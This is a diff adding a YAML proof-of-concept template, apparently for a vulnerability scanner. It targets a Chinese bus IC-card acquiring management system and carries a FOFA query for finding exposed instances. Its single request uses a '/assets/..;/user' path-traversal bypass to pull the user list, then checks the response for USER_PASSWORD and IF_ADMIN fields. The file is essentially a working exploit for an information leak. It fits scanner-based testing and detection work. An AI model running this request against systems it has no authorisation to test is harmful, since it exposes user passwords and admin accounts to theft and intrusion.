@@ -1,0 +1,19 @@
+id: poc-yaml-bus-ic-user-info-leak
+info:
+  name: 公交IC卡收单管理系统 assets 信息泄露
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 公交IC卡收单管理系统
+  fofa: app="公交IC卡收单管理系统"
+requests:
+- method: POST
+  path: /assets/..;/user
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: _search=false&nd=&rowCountPerPage=10&pageNo=1&sidx=USER_NAME&sord=asc&method=select&USER_NAME=&REAL_NAME=&ACCOUNT_EXPIRE_TIME=%E5%BF%BD%E7%95%A5&PASSWORD_EXPIRE_TIME=%E5%BF%BD%E7%95%A5
+  expression: "status_code == 200 && \ncontains(body,\"\\\"USER_PASSWORD\\\"\") &&\n\
+    contains(body,\"\\\"USER_PASSWORD\\\"\") &&\ncontains(body,\"\\\"IF_ADMIN\\\"\"\
+    )\n"
+variables: {}
+transport: http
